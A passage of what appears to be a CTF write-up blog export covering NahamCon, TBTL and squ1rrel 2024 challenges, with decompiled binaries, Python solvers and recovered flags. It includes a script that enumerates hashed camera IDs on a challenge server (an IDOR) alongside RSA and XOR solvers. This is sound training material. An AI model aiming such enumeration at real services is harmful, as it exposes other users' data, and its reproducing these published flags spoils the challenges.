\u0026#34;FRsIAQ8PVBUVEREIVERbBkURFkUIBxVQVkAYFxJfV0FYVkIVQgo=\u0026#34;, 52); v16 = _finalizeUninitializedArray\u0026lt;A\u0026gt;(_:)(v8, \u0026amp;dword_100000014); v20 = static Array\u0026lt;A\u0026gt;.== infix(_:_:)(v17); swift_bridgeObjectRelease(v16); swift_bridgeObjectRelease(v17); swift_bridgeObjectRelease(v18); swift_bridgeObjectRelease(v19); return v20 \u0026amp; 1;\rFinal solver\nsolver.py\r1import base64 2 3# Hardcoded string in ASCII values 4hardcoded_string = [115, 119, 105, 102, 116, 105, 101, 115, 33] # \u0026#34;swifties!\u0026#34; 5 6hardcoded_base64 = \u0026#34;FRsIAQ8PVBUVEREIVERbBkURFkUIBxVQVkAYFxJfV0FYVkIVQgo=\u0026#34; 7decoded_base64 = base64.b64decode(hardcoded_base64) 8 9result = \u0026#39;\u0026#39;.join(chr(decoded_base64[i] ^ hardcoded_string[i % len(hardcoded_string)]) for i in range(len(decoded_base64))) 10print(result)\r$ python3 solver.py flag{f1f4bfa202c60e2aaa9339de61513141}\rFLAG\rflag{f1f4bfa202c60e2aaa9339de61513141}\nRing Cycle 1 - Basics Overview\rAuthor: @awesome10billion Description: Let us start with a simple one and see if you can break into this vault.\nNOTE, the plaintext that you provide the binary should be readable English. Reverse engineer the binary to understand what it really does\u0026hellip; patching the binary will ultimately give you the wrong answer. basics.txt basics\nNext, the first of rev category challenge group and the last rev category I solved.\nlet\u0026rsquo;s decompile first\ndecompiled main\rint __cdecl main(int argc, const char **argv, const char **envp) { size_t v4; // rax int i; // [rsp+4h] [rbp-6Ch] FILE *stream; // [rsp+8h] [rbp-68h] __int64 nmemb; // [rsp+10h] [rbp-60h] void *ptr; // [rsp+18h] [rbp-58h] char v9[16]; // [rsp+20h] [rbp-50h] BYREF char s[56]; // [rsp+30h] [rbp-40h] BYREF unsigned __int64 v11; // [rsp+68h] [rbp-8h] v11 = __readfsqword(0x28u); init(argc, argv, envp); printf(\u0026#34;What is the passphrase of the vault?\\n\u0026gt; \u0026#34;); fgets(s, 50, stdin); if ( (unsigned __int8)check(s) ) { stream = fopen(\u0026#34;basics.txt\u0026#34;, \u0026#34;r\u0026#34;); if ( !stream ) return -1; fseek(stream, 0LL, 2); nmemb = ftell(stream); fseek(stream, 0LL, 0); ptr = calloc(nmemb, 1uLL); if ( !ptr ) return -1; fread(ptr, 1uLL, nmemb, stream); fclose(stream); printf((const char *)ptr); v4 = strlen(s); MD5(s, v4, v9); printf(\u0026#34;flag{\u0026#34;); for ( i = 0; i \u0026lt;= 15; ++i ) printf(\u0026#34;%02x\u0026#34;, (unsigned __int8)v9[i]); puts(\u0026#34;}\u0026#34;); } else { puts(\u0026#34;Wrong passphrase!\u0026#34;); } return 0; }\rdecompiled check\r_BOOL8 __fastcall check(__int64 a1) { char v2; // [rsp+11h] [rbp-8Fh] char v3; // [rsp+12h] [rbp-8Eh] char v4; // [rsp+13h] [rbp-8Dh] int i; // [rsp+14h] [rbp-8Ch] int j; // [rsp+18h] [rbp-88h] int k; // [rsp+1Ch] [rbp-84h] char s1[64]; // [rsp+20h] [rbp-80h] BYREF char s2[56]; // [rsp+60h] [rbp-40h] BYREF unsigned __int64 v10; // [rsp+98h] [rbp-8h] v10 = __readfsqword(0x28u); for ( i = 0; i \u0026lt;= 24; ++i ) { v4 = *(_BYTE *)(i + a1); s1[i] = *(_BYTE *)(50 - i - 1LL + a1); s1[49 - i] = v4; } for ( j = 0; j \u0026lt;= 49; ++j ) { v3 = s1[j]; s1[j] = s1[j + 1]; s1[j + 1] = v3; } s1[49] = 0; for ( k = 0; k \u0026lt;= 47; k += 2 ) { v2 = s1[k]; s1[k] = s1[k + 1]; s1[k + 1] = v2; } strcpy(s2, \u0026#34;eyrnou jngkiaccre af suryot arsto tdyea rre aouY\u0026#34;); return strcmp(s1, s2) == 0; }\rThe check function is used to validate the passphrase input. If the passphrase is correct, the main function will print out the flag.\nThe check function does the following operations on the input string:\nSwaps every pair of characters. Shifts all characters one position to the right. Reverses the string. Final solver,\nsolver.py\r1import subprocess 2 3def reverse_check(s): 4 s = list(s) 5 for k in range(0, 47, 2): 6 s[k], s[k + 1] = s[k + 1], s[k] 7 s = \u0026#39;\u0026#39;.join(s) 8 s = s[1:] + s[0] 9 s = s[::-1] 10 s = s[1:] + s[0] 11 return s 12 13passphrase = reverse_check(\u0026#34;eyrnou jngkiaccre af suryot arsto tdyea rre aouY\u0026#34;) 14print(passphrase) 15 16subprocess.run([\u0026#39;./basics\u0026#39;], input=passphrase, text=True)\r$ python3 solver.py You are ready to start your safe cracking journey What is the passphrase of the vault? \u0026gt; ******************************************************************************* | | | | _________|________________.=\u0026#34;\u0026#34;_;=.______________|_____________________|_______ | | ,-\u0026#34;_,=\u0026#34;\u0026#34; `\u0026#34;=.| | |___________________|__\u0026#34;=._o`\u0026#34;-._ `\u0026#34;=.______________|___________________ | `\u0026#34;=._o`\u0026#34;=._ _`\u0026#34;=._ | _________|_____________________:=._o \u0026#34;=._.\u0026#34;_.-=\u0026#34;\u0026#39;\u0026#34;=.__________________|_______ | | __.--\u0026#34; , ; `\u0026#34;=._o.\u0026#34; ,-\u0026#34;\u0026#34;\u0026#34;-._ \u0026#34;. | |___________________|_._\u0026#34; ,. .` ` `` , `\u0026#34;-._\u0026#34;-._ \u0026#34;. \u0026#39;__|___________________ | |o`\u0026#34;=._` , \u0026#34;` `; .\u0026#34;. , \u0026#34;-._\u0026#34;-._; ; | _________|___________| ;`-.o`\u0026#34;=._; .\u0026#34; ` \u0026#39;`.\u0026#34;\\` . \u0026#34;-._ /_______________|_______ | | |o; `\u0026#34;-.o`\u0026#34;=._`` \u0026#39;` \u0026#34; ,__.--o; | |___________________|_| ; (#) `-.o `\u0026#34;=.`_.--\u0026#34;_o.-; ;___|___________________ ____/______/______/___|o;._ \u0026#34; `\u0026#34;.o|o_.--\u0026#34; ;o;____/______/______/____ /______/______/______/_\u0026#34;=._o--._ ; | ; ; ;/______/______/______/_ ____/______/______/______/__\u0026#34;=._o--._ ;o|o; _._;o;____/______/______/____ /______/______/______/______/____\u0026#34;=._o._; | ;_.--\u0026#34;o.--\u0026#34;_/______/______/______/_ ____/______/______/______/______/_____\u0026#34;=.o|o_.--\u0026#34;\u0026#34;___/______/______/______/____ /______/______/______/______/______/______/______/______/______/______/[TomekK] ******************************************************************************* flag{8562e979f1f754537a4e872cc20a73e8}\rFLAG\rflag{8562e979f1f754537a4e872cc20a73e8}\nWeb Exploitation iDoor Overview\rAuthor: @awesome10billion Description: It\u0026rsquo;s Apple\u0026rsquo;s latest innovation, the \u0026ldquo;iDoor!\u0026rdquo; \u0026hellip; well, it is basically the Ring Doorbell camera, but the iDoor offers a web-based browser to monitor your camera, and super secure using ultimate cryptography with even SHA256 hashing algorithms to protect customers! Don\u0026rsquo;t even think about snooping on other people\u0026rsquo;s cameras!! http://challenge.nahamcon.com:31646 The service are already down, so here\u0026rsquo;s my solver\nsolver.py\r1import re 2import hashlib 3import requests 4from bs4 import BeautifulSoup 5 6base_url = \u0026#34;http://challenge.nahamcon.com:31646/\u0026#34; 7 8for i in range(20): 9 sha256_hash = hashlib.sha256(str(i).encode()).hexdigest() 10 url = base_url + sha256_hash 11 response = requests.get(url) 12 soup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;) 13 card_body = soup.find(\u0026#39;div\u0026#39;, class_=\u0026#39;card-body\u0026#39;) 14 print(f\u0026#34;URL: {url}\u0026#34;) 15 print(f\u0026#34;Response:\\n{card_body}\\n\u0026#34;) 16 17 flag = re.findall(r\u0026#39;flag{.*}\u0026#39;, str(card_body)) 18 19 if flag: 20 print(flag[0]) 21 break\rThe script bruteforces a specific URL by replacing parts of the URL with a SHA256 hash of numbers 0 to 19. For each generated URL, the script performs an HTTP GET request and looks for the flag{.*} pattern in the HTML response.\nIf the pattern is found (which means the flag has been found), the script prints the flag and stops. Otherwise, the script will continue to the next iteration until all numbers in the range have been tried. In this case, the script encountered the flag on the first iteration (number 0), so the script stopped after the first iteration.\n$ python3 solver.py URL: http://challenge.nahamcon.com:31646/5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9 Response: \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;div style=\u0026#34;text-align: center; vertical-align: middle; height: 100%;\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;b\u0026gt;\u0026lt;code\u0026gt;flag{770a058a80a9bca0a87c3e2ebe1ee9b2}\u0026lt;/code\u0026gt;\u0026lt;/b\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; flag{770a058a80a9bca0a87c3e2ebe1ee9b2}\rFLAG\rflag{770a058a80a9bca0a87c3e2ebe1ee9b2}\nAll About Robots Overview\rAuthor: @JohnHammond Description: Oh wow! Now you can learn all about robots, with our latest web service, All About Robots!! http://challenge.nahamcon.com:30998/ The service are already down, so here\u0026rsquo;s my solver\nsolver.py\r1import re 2import hashlib 3import requests 4from bs4 import BeautifulSoup 5 6base_url = \u0026#34;http://challenge.nahamcon.com:30998\u0026#34; 7 8robotstxt = \u0026#34;/robots.txt\u0026#34; 9endpoint = \u0026#34;/open_the_pod_bay_doors_hal_and_give_me_the_flag.html\u0026#34; 10 11response = requests.get(base_url + endpoint) 12 13flag = re.findall(r\u0026#39;flag{.*}\u0026#39;, response.text) 14 15print(flag[0])\rFLAG\rflag{3f19b983c1de42bd49af1a237d7e57b9}\nWarmups QRRRRRRRR Overview\rAuthor: @JohnHammond Description: Wait a second, they made QR codes longer!?! qrrrrrrrr.png They provide a long qr image\nBut the athor which John Hammond has discussed this in his YouTube video,\nWe can scan it using QRQR - QR Code® Reader\nFLAG\rflag{a44557e380e3baae9c21c738664c6142}\nEICAR Overview\rAuthor: @JohnHammond Description: What is the MD5 hash of this file?\nWrap the hexadecimal value in the flag{ prefix and { suffix to match the standard flag format.\nNote, your antivirus engine might flag this file \u0026ndash; don\u0026rsquo;t worry, I promise it\u0026rsquo;s not malware :) eicar Here we go, just wrap it to flag{.*}\n$ md5sum eicar 44d88612fea8a8f36de82e1278abb02f eicar\rFLAG\rflag{44d88612fea8a8f36de82e1278abb02f}\nThat\u0026rsquo;s Not My Base Overview\rAuthor: @JohnHammond Description: Everyone knows about Base64, but do you know about this one?\n(Remember, the flag format starts with flag{!) F#S\u0026lt;YRXdP0Fd=,%J4c$Ph7XV(gF/*]%C4B\u0026lt;qlH+%3xGHo)\\ Just decode from base92 F#S\u0026lt;YRXdP0Fd=,%J4c$Ph7XV(gF/*]%C4B\u0026lt;qlH+%3xGHo)\\\nDecoded from base92\nFLAG\rflag{784454a9509196a33dba242c423c057a}\nUriel Overview\rAuthor: @JohnHammond Description: Everyone knows about Base64, but do you know about this one?\n(Remember, the flag format starts with flag{!) F#S\u0026lt;YRXdP0Fd=,%J4c$Ph7XV(gF/*]%C4B\u0026lt;qlH+%3xGHo)\\ Just decode from url decode 2 times\nsolver.py\r1from urllib.parse import unquote 2 3url = \u0026#34;%25%36%36%25%36%63%25%36%31%25%36%37%25%37%62%25%33%38%25%36%35%25%36%36%25%36%35%25%36%32%25%33%36%25%33%36%25%36%31%25%33%37%25%33%31%25%33%39%25%36%32%25%33%37%25%33%35%25%36%31%25%33%34%25%36%32%25%33%37%25%36%33%25%33%36%25%33%33%25%33%34%25%36%34%25%33%38%25%33%38%25%33%35%25%33%37%25%33%38%25%33%38%25%36%34%25%36%36%25%36%33%25%37%64\u0026#34; 4 5# Perform unquoting twice 6print(unquote(unquote(url)))\rFLAG\rflag{8efeb66a719b75a4b7c634d885788dfc}\nTwine Overview\rAuthor: @JohnHammond#6971 Description: Google tells me that twine means: \u0026ldquo;strong thread or string consisting of two or more strands of hemp, cotton, or nylon twisted together.\u0026rdquo; twine.jpg Just strings it\n$ strings twine.jpg | grep -o \u0026#39;flag{[^}]*}\u0026#39; flag{4ac54e3ba5f8f09049f3ad62403abb25}\rFLAG\rflag{4ac54e3ba5f8f09049f3ad62403abb25}\n","date":"2024-05-25","id":13,"permalink":"/posts/ctfs/2024/nahamcon-ctf-2024/","summary":"https://ctftime.org/event/2364\nCHALL\u0026rsquo;S SOLVED Category Challenge Reverse Engineering IPromise Reverse Engineering Taylor\u0026rsquo;s First Swift Reverse Engineering Ring Cycle 1 - Basics Web Exploitation iDoor Web Exploitation All About Robots Warmups QRRRRRRRR Warmups EICAR Warmups That\u0026rsquo;s Not My Base Warmups Uriel Warmups Twine Reverse Engineering IPromise Overview\rAuthor: @soups71 Description: Instead of making the next IPhone, I made this challenge.","tags":[],"title":"NahamCon CTF 2024"},{"content":"https://ctftime.org/event/2324\nCHALL\u0026rsquo;S SOLVED Category Challenge Crypto Fence Building Intro Sanity.py Rev Flagcheck Crypto Fence Building Overview\rDescription: I\u0026rsquo;ve recently got into woodworking and have build a beautiful fence just like this one.\nNow I\u0026rsquo;m working on a flag, but it turns out all garbled for some reason\u0026hellip; T0n40g5BG03cmk0D1hr}T{dFe_3g_3buL_5_n0 In this crypto challenge, only a ciphertext is given which needs to be decoded and the hint is also given.\nThis classic challenge ciphertext is text that is encoded using Rail Fence Encoding (also called zigzag cipher) is a transposition cipher. The message is written in a zigzag pattern on an imaginary fence, thus its name. It is not strong as the number of keys is small enough to brute force them.\nWe can just decode using CyberChef, here\u0026rsquo;s the recipe Railfence Ciphertext Decode\nor here\u0026rsquo;s the solver implementation using python and bruteforcing the key\nsolver.py\r1import re 2 3ciphertext = \u0026#39;T0n40g5BG03cmk0D1hr}T{dFe_3g_3buL_5_n0\u0026#39; 4 5def rail_fence_decrypt(ciphertext, rails): 6 matrix = [[\u0026#39;\u0026#39; for _ in range(len(ciphertext))] for _ in range(rails)] 7 idx = 0 8 for rail in range(rails): 9 p = (rail != 0 and rail != (rails - 1)) 10 r = rail 11 while r \u0026lt; len(ciphertext): 12 matrix[rail][r] = \u0026#39;*\u0026#39; 13 if p: 14 r += 2 * (rails - rail - 1) 15 else: 16 r += 2 * rail 17 p = not p 18 r = 0 19 for i in range(rails): 20 for j in range(len(ciphertext)): 21 if matrix[i][j] == \u0026#39;*\u0026#39;: 22 matrix[i][j] = ciphertext[r] 23 r += 1 24 plaintext = \u0026#39;\u0026#39; 25 for i in range(len(ciphertext)): 26 for j in range(rails): 27 if matrix[j][i] != \u0026#39;\u0026#39;: 28 plaintext += matrix[j][i] 29 return plaintext 30 31def find_string(plaintext): 32 pattern = r\u0026#39;TBTL{.*}\u0026#39; 33 match = re.search(pattern, plaintext) 34 if match: 35 return match.group() 36 return None 37 38for rails in range(2, len(ciphertext)): 39 plaintext = rail_fence_decrypt(ciphertext, rails) 40 found_string = find_string(plaintext) 41 if found_string: 42 print(f\u0026#39;Key: {rails} \\nFlag: {found_string}\u0026#39;) 43 break\r$ python3 solver.py Key: 4 Flag: TBTL{G00d_F3nce5_m4k3_g00D_n31ghb0ur5}\rFLAG\rTBTL{G00d_F3nce5_m4k3_g00D_n31ghb0ur5}\nIntro Sanity.py Overview\r\u0026quot;}FTC_3h7_y0jn3-!d3s54P_kc3hC_y71n4S{LTBT\u0026quot;[::-1] This Sanity check is a pretty simple, we can just reverse the bytes [::-1] of it.\n$ python3 \u0026gt;\u0026gt;\u0026gt; flag = \u0026#34;}FTC_3h7_y0jn3-!d3s54P_kc3hC_y71n4S{LTBT\u0026#34; \u0026gt;\u0026gt;\u0026gt; print(flag[::-1]) TBTL{S4n17y_Ch3ck_P45s3d!-3nj0y_7h3_CTF} \u0026gt;\u0026gt;\u0026gt;\rFLAG\rTBTL{S4n17y_Ch3ck_P45s3d!-3nj0y_7h3_CTF}\nRev Flagcheck Overview\rDescription: This one is simple — you provide the flag, and the binary tells you if its correct. chall Move on to rev category, this challenge is like Flagchecker of ELF 64 Binary\nBinary Information\r$ file flagcheck flagcheck: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=68da80acf7353d56f047fa725e2506428b7c6864, for GNU/Linux 3.2.0, not stripped\rLet\u0026rsquo;s try to executing the binary file\n$ chmod +x chall $ ./chall Let me check your flag: idk ma boahh Nope...\rHere\u0026rsquo;s the decompiled of main function,\ndecompiled main\rint __cdecl main(int argc, const char **argv, const char **envp) { int v3; // ebx int seed; // [rsp+4h] [rbp-6Ch] int i; // [rsp+8h] [rbp-68h] int j; // [rsp+Ch] [rbp-64h] char s[72]; // [rsp+10h] [rbp-60h] BYREF unsigned __int64 v9; // [rsp+58h] [rbp-18h] v9 = __readfsqword(0x28u); printf(\u0026#34;Let me check your flag: \u0026#34;); __isoc99_scanf(\u0026#34;%s\u0026#34;, s); if ( strlen(s) != 63 ) no(); seed = 1; for ( i = 0; i \u0026lt; strlen(s); ++i ) seed *= s[i]; srand(seed); for ( j = 0; j \u0026lt; strlen(s); ++j ) { v3 = s[j]; if ( ((rand() % 256) ^ v3) != target[j] ) no(); } puts(\u0026#34;Correct!\u0026#34;); return 0; }\rFrom the decompiled code looks like an xor program and I\u0026rsquo;m quite curious about what the target array will do.\n.rodata:0000000000002020 ; _DWORD target[63] .rodata:0000000000002020 _ZL6target dd 33h, 84h, 3Dh, 3Fh, 2Ah, 93h, 7Bh, 82h, 1Ah, 0ACh, 8Eh .rodata:0000000000002020 ; DATA XREF: main+E4↑o .rodata:0000000000002020 dd 0F4h, 0B1h, 0CBh, 8Dh, 21h, 0Eh, 0B7h, 67h, 96h, 2Ch .rodata:0000000000002020 dd 81h, 0D3h, 0BCh, 29h, 6Ch, 4Bh, 0Dh, 0, 0EDh, 0FDh .rodata:0000000000002020 dd 0EEh, 56h, 40h, 52h, 0D5h, 5, 6Dh, 90h, 3Eh, 7Ah, 1Bh .rodata:0000000000002020 dd 69h, 23h, 1Fh, 0B6h, 1Dh, 0BCh, 98h, 0D1h, 0A6h, 83h .rodata:0000000000002020 dd 0E9h, 0EBh, 13h, 21h, 3Dh, 0F8h, 2Bh, 79h, 53h, 4Fh .rodata:0000000000002020 dd 0A1h\rAha nice! the value of target array has discovered from .rodata section.\nSo here\u0026rsquo;s the conclusion, The program will reads the flag, checks its length, calculates a seed for the random number generator from the flag, and then checks each character of the flag against a value in the target array.\nThe target array is XORed with the result of rand() % 0x100. Since the seed for rand() is determined by the flag, we can predict the sequence of random numbers. However, that the seed is calculated by multiplying all the ASCII values of the characters in the flag, which makes it difficult to reverse.\nHere\u0026rsquo;s the high-level approach to solve this:\nBrute force the seed: Since the seed is a product of ASCII values, and ASCII printable characters range from 32 to 126, the maximum value for the seed is 126^63. However, this is not feasible to brute force. But, considering that the flag format is TBTL{.*}, we can reduce the search space. The seed is also an uint (32-bit), so the maximum value is 2^32-1. This is feasible to brute force. Predict the random sequence: Once the seed are correct, we can generate the same sequence of random numbers as the program. Recover the flag: Now that the same rand() sequence, we can manage to recover the flag. For each character in the flag, calculate target[i] ^ (rand() % 0x100) to get the original character. Here\u0026rsquo;s the solver,\nsolver.py\r1import ctypes 2 3# The target array from the .rodata 4target = [0x33, 0x84, 0x3D, 0x3F, 0x2A, 0x93, 0x7B, 0x82, 0x1A, 0xAC, 0x8E, 0xF4, 0xB1, 0xCB, 0x8D, 0x21, 0xE, 0xB7, 0x67, 0x96, 0x2C, 0x81, 0xD3, 0xBC, 0x29, 0x6C, 0x4B, 0xD, 0x0, 0xED, 0xFD, 0xEE, 0x56, 0x40, 0x52, 0xD5, 0x5, 0x6D, 0x90, 0x3E, 0x7A, 0x1B, 0x69, 0x23, 0x1F, 0xB6, 0x1D, 0xBC, 0x98, 0xD1, 0xA6, 0x83, 0xE9, 0xEB, 0x13, 0x21, 0x3D, 0xF8, 0x2B, 0x79, 0x53, 0x4F, 0xA1] 5 6# The libc rand() function 7libc = ctypes.CDLL(\u0026#39;libc.so.6\u0026#39;) 8rand = libc.rand 9rand.argtypes = [] 10rand.restype = ctypes.c_int 11 12# The libc srand() function 13srand = libc.srand 14srand.argtypes = [ctypes.c_uint] 15srand.restype = None 16 17# Brute force the seed 18for seed in range(2**32): 19 srand(seed) 20 flag = [] 21 for i in range(len(target)): 22 r = rand() % 0x100 23 flag.append(chr(target[i] ^ r)) 24 if flag[0] == \u0026#39;T\u0026#39; and flag[1] == \u0026#39;B\u0026#39; and flag[2] == \u0026#39;T\u0026#39; and flag[3] == \u0026#39;L\u0026#39;: 25 print(\u0026#39;\u0026#39;.join(flag)) 26 break\r$ python3 solver.py TBTL{l1n3a4_C0ngru3n7i41_6en3r4t0r_b453d_Fl4G_Ch3ckEr_G03z_8rr}\rFLAG\rTBTL{l1n3a4_C0ngru3n7i41_6en3r4t0r_b453d_Fl4G_Ch3ckEr_G03z_8rr}\n","date":"2024-05-10","id":14,"permalink":"/posts/ctfs/2024/tbtl-ctf-2024/","summary":"https://ctftime.org/event/2324\nCHALL\u0026rsquo;S SOLVED Category Challenge Crypto Fence Building Intro Sanity.py Rev Flagcheck Crypto Fence Building Overview\rDescription: I\u0026rsquo;ve recently got into woodworking and have build a beautiful fence just like this one.","tags":[],"title":"TBTL CTF 2024"},{"content":"https://ctftime.org/event/2370\nCHALL\u0026rsquo;S SOLVED Category Challenge Crypto Lazy RSA Crypto RSA RSA RSA Misc rainbolt0 Rev Secret Coffee Nut Stash Rev PYC Fun Crypto Lazy RSA Overview\rDescription: Generating primes is too hard, but I did find a couple posted online! lazyrsa.txt This is the most common RSA challenges:\nn: the modulus for both the public and private keys e: the public exponent ct: the ciphertext want to decrypt n: 23690620655271165329693230765997410033604713853187305472268813793031152348107488119317901392104240429826482611449247251262846508667797483465355228800439339041030982259847598574606272955688345490638311164838117491821117626835340577511562130640807587611523935604871183668968359720411023759980144229161581597397061850707647104033348795132205561234674677139395868595692235525931999596382758921793937149945229459379437008216713404350896206374483356969246476531491049930769999387038678280465689487577291475554699094024761030833540509263174840007922218340417888061099317752496279552046029470370474619439450870110783844218281 e: 65537 ct: 11420169733597912638453974310976296342840438772934899653944946284527921765463891354182152294616337665313108085636067061251485792996493148094827999964385583364992542843630846911864602981658349693548380259629884212903554470004231160866680745154066318419977485221228944716844036265911222656710479650139274719426252576406561307088938784324291655853920727176132853663822020880574204790442647169649094846806057218165102873847070323190392619997632103724159815363319643022552432448214770378596825200154298562513279104608157870845848578603703757405758227316242247843290673221718467366000253484278487854736033323783510299081405\rTo solve this, we will factor {n} into two prime numbers, {p} and {q}. Typically this phase is the most time consuming, especially if {n} is a large number. As in the challenge description, according to challenge description \u0026ldquo;Generating primes is too hard, but I did find a couple posted online!\u0026rdquo; by using factorization tools available online such as FactorDB.\nOnce we get the factor n. Here\u0026rsquo;s a possible step to check whether p and q are indeed factors of n.\nn = 23690620655271165329693230765997410033604713853187305472268813793031152348107488119317901392104240429826482611449247251262846508667797483465355228800439339041030982259847598574606272955688345490638311164838117491821117626835340577511562130640807587611523935604871183668968359720411023759980144229161581597397061850707647104033348795132205561234674677139395868595692235525931999596382758921793937149945229459379437008216713404350896206374483356969246476531491049930769999387038678280465689487577291475554699094024761030833540509263174840007922218340417888061099317752496279552046029470370474619439450870110783844218281 p = 136883787266364340043941875346794871076915042034415471498906549087728253259343034107810407965879553240797103876807324140752463772912574744029721362424045513479264912763274224483253555686223222977433620164528749150128078791978059487880374953312009335263406691102746179899587617728126307533778214066506682031517 q = 173071049014527992115134608840044450224804187710129859708853805709176487316207010402251651554296674942983458628001825388092613984020357016543095854903752286499436288875811897772811421580394898931781960982007306544027009178109074133665714245347548210688178519450728052309689045110008994598784658702110905581693 if p * q == n: print(\u0026#34;p * q == n\u0026#34;) else: print(\u0026#34;p * q != n\u0026#34;)\rFinal solver:\nsolver.py\r1from Crypto.Util.number import inverse, long_to_bytes 2 3# given values 4n = 23690620655271165329693230765997410033604713853187305472268813793031152348107488119317901392104240429826482611449247251262846508667797483465355228800439339041030982259847598574606272955688345490638311164838117491821117626835340577511562130640807587611523935604871183668968359720411023759980144229161581597397061850707647104033348795132205561234674677139395868595692235525931999596382758921793937149945229459379437008216713404350896206374483356969246476531491049930769999387038678280465689487577291475554699094024761030833540509263174840007922218340417888061099317752496279552046029470370474619439450870110783844218281 5e = 65537 6ct = 11420169733597912638453974310976296342840438772934899653944946284527921765463891354182152294616337665313108085636067061251485792996493148094827999964385583364992542843630846911864602981658349693548380259629884212903554470004231160866680745154066318419977485221228944716844036265911222656710479650139274719426252576406561307088938784324291655853920727176132853663822020880574204790442647169649094846806057218165102873847070323190392619997632103724159815363319643022552432448214770378596825200154298562513279104608157870845848578603703757405758227316242247843290673221718467366000253484278487854736033323783510299081405 7 8# factorized {n} with factordb.com 9p = 136883787266364340043941875346794871076915042034415471498906549087728253259343034107810407965879553240797103876807324140752463772912574744029721362424045513479264912763274224483253555686223222977433620164528749150128078791978059487880374953312009335263406691102746179899587617728126307533778214066506682031517 10q = 173071049014527992115134608840044450224804187710129859708853805709176487316207010402251651554296674942983458628001825388092613984020357016543095854903752286499436288875811897772811421580394898931781960982007306544027009178109074133665714245347548210688178519450728052309689045110008994598784658702110905581693 11 12phi = (p - 1) * (q - 1) 13d = inverse(e, phi) 14m = pow(ct, d, n) 15 16message = long_to_bytes(m) 17print(message)\r$ python3 solve.py b\u0026#39;squ1rrel{laziness_will_be_the_answer_eventually}\u0026#39;\rFLAG\rsqu1rrel{laziness_will_be_the_answer_eventually}\nRSA RSA RSA Overview\rDescription: I had something so important to say that I just had to tell three of my friends! rsarsarsa.txt This one is a RSA Chinese Remainder Theorem (CRT) challenge. From the provided chall source, we given three ciphertexts and three moduli, all encrypted with the same exponent {e}.\ne: 3 n1: 96137714481560340073780038250015316564930752333880363375193088083653975552334517899735106334409092229494004991796910602440032630762575914714152238916128674595912438177270978040111855327624812652948702562503276973409716595778936978757384935820012322432156169815110042972411989274515686945691887468406312791931 ct1: 45640508926729498938915879450220374487095109122207451961200230820161694723491945276893630019713859109920025191680053056485030809079137883906737197875968862878423820820515399840094772412319820062860149582361429346029277273870654355752499436360499181221418835401103925420623212341317366954144592892392013649421 n2: 90990790933807553440094447797505116528289571569256574363585309090304380702927241663491819956599368816997683603352289726407304960362149545383683196526764288524742203975596414405902155486632888712453606841629050125783639571606440840246928825545860143096340538904060826483178577619093666337611264852255012241011 ct2: 58149644956871439128498229750735120049939213159976216414725780828349070974351356297226894029560865402164610877553706310307735037479690463594397903663323983980128060190648604447657636452565715178438939334318494616246072096228912870579093620604596752844583453865894005036516299903524382604570097012992290786402 n3: 86223965871064436340735834556059627182534224217231808576284808010466364412704836149817574186647031512768701943310184993378236691990480428328117673064942878770269493388776005967773324771885109757090215809598845563135795831857972778498394289917587876390109949975194987996902591291672194435711308385660176310561 ct3: 16168828246411344105159374934034075195568461748685081608380235707338908077276221477034184557590734407998991183114724523494790646697027318500705309235429037934125253625837179003478944984233647083364969403257234704649027075136139224424896295334075272153594459752240304700899700185954651799042218888117178057955\rBy combining these equations and solving for the plaintext message, the solution makes use of the CRT. Here\u0026rsquo;s how to do it:\nsolver.py\r1from sympy import * 2from Crypto.Util.number import long_to_bytes 3 4# given values 5e = 3 6n1 = 96137714481560340073780038250015316564930752333880363375193088083653975552334517899735106334409092229494004991796910602440032630762575914714152238916128674595912438177270978040111855327624812652948702562503276973409716595778936978757384935820012322432156169815110042972411989274515686945691887468406312791931 7ct1 = 45640508926729498938915879450220374487095109122207451961200230820161694723491945276893630019713859109920025191680053056485030809079137883906737197875968862878423820820515399840094772412319820062860149582361429346029277273870654355752499436360499181221418835401103925420623212341317366954144592892392013649421 8n2 = 90990790933807553440094447797505116528289571569256574363585309090304380702927241663491819956599368816997683603352289726407304960362149545383683196526764288524742203975596414405902155486632888712453606841629050125783639571606440840246928825545860143096340538904060826483178577619093666337611264852255012241011 9ct2 = 58149644956871439128498229750735120049939213159976216414725780828349070974351356297226894029560865402164610877553706310307735037479690463594397903663323983980128060190648604447657636452565715178438939334318494616246072096228912870579093620604596752844583453865894005036516299903524382604570097012992290786402 10n3 = 86223965871064436340735834556059627182534224217231808576284808010466364412704836149817574186647031512768701943310184993378236691990480428328117673064942878770269493388776005967773324771885109757090215809598845563135795831857972778498394289917587876390109949975194987996902591291672194435711308385660176310561 11ct3 = 16168828246411344105159374934034075195568461748685081608380235707338908077276221477034184557590734407998991183114724523494790646697027318500705309235429037934125253625837179003478944984233647083364969403257234704649027075136139224424896295334075272153594459752240304700899700185954651799042218888117178057955 12 13# compute N = n1*n2*n3 14N = n1*n2*n3 15 16# compute Ni and yi for i in {1,2,3} 17N1 = N // n1 18y1 = pow(N1, -1, n1) 19N2 = N // n2 20y2 = pow(N2, -1, n2) 21N3 = N // n3 22y3 = pow(N3, -1, n3) 23 24# compute m^3 using CRT 25m_cubed = (ct1*N1*y1 + ct2*N2*y2 + ct3*N3*y3) % N 26 27# compute m by taking cube root of m^3 28m = root(m_cubed, 3) 29 30flag = long_to_bytes(m) 31 32print(flag)\r$ python3 solve.py b\u0026#39;squ1rrel{math_is_too_powerful_1q3y41t1s98u23rf8}\u0026#39;\rFLAG\rsqu1rrel{math_is_too_powerful_1q3y41t1s98u23rf8}\nMisc rainbolt0 Overview\rDescription: Once you\u0026rsquo;ve tracked down the location find it on here: https://what3words.com/ and submit as the flag example: squ1rrel{painting.impact.picture} rainbolt0.png As per the description of the challenge, we were asked to find the landmark location of the image. Using Google Lens, we quickly located the \u0026quot;Parthenon\u0026quot; landmark and discovered that it corresponds to the image.\nNext, in accordance with the challenge descrition, we utilized What3words. This unique geocoding method is capable of pinpointing places on the surface of the planet with a resolution of around 3 meters.\nFLAG\rsqu1rrel{half.blues.number}\nRev Secret Coffee Nut Stash Overview\rDescription: You\u0026rsquo;ll never be able to break into my 